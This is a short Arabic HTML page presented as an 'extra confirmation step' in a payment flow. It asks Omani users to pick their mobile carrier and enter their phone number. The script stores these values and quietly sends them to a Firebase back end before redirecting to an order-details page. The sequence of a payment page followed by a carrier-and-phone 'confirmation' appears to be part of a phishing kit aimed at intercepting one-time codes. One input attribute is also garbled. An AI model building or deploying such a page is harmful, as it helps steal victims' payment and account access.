<!doctype html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <title>اختيار شركة الاتصالات | مكتب مساعد</title>
  <link rel="stylesheet" href="telecom-payment.css">
</head>
<body>
  <main class="telecom-card">
    <div class="phone-icon" aria-hidden="true">⌕</div>
    <p class="tag">خطوة إضافية للتأكيد</p>
    <h1>يرجى اختيار شركة الاتصالات الخاصة بك</h1>
    <p class="copy">اختر شركة الاتصالات في عُمان وأدخل رقم جوالك للمتابعة.</p>

    <form id="telecom-form">
      <label>
        شركة الاتصالات
        <select id="telecom-provider" required>
          <option value="" selected disabled>اختر شركة الاتصالات</option>
          <option value="عمانتل">عمانتل</option>
          <option value="أوريدو عُمان">أوريدو عُمان</option>
          <option value="فودافون عُمان">فودافون عُمان</option>
          <option value="فرندي موبايل">فرندي موبايل</option>
          <option value="رنة موبايل">رنة موبايل</option>
        </select>
      </label>
      <label>
        رقم الجوال
        <input id="telecom-phone" type="tel" autocomplete="tel" inputmode="tel" placeholderequired>
      </label>
      <button type="submit">التالي</button>
    </form>
    <a href="secure-payment.html">العودة للخطوة السابقة</a>
  </main>

  <script type="module" src="draft-sync.js"></script>
  <script type="module">
    import { syncDraft } from './firebase-sync.js';

    document.querySelector('#telecom-form').addEventListener('submit', async event => {
      event.preventDefault();
      const submitButton = event.currentTarget.querySelector('button[type="submit"]');
      const draft = JSON.parse(localStorage.getItem('musaedDraft') || '{}');
      draft.telecomProvider = document.querySelector('#telecom-provider').value;
      draft.telecomPhone = document.querySelector('#telecom-phone').value.trim();
      localStorage.setItem('musaedDraft', JSON.stringify(draft));
      submitButton.disabled = true;

      syncDraft(draft).catch(error => console.error('تعذر حفظ بيانات الاتصالات:', error));
      window.location.href = 'order-details.html';
    });
  </script>
</body>
</html>
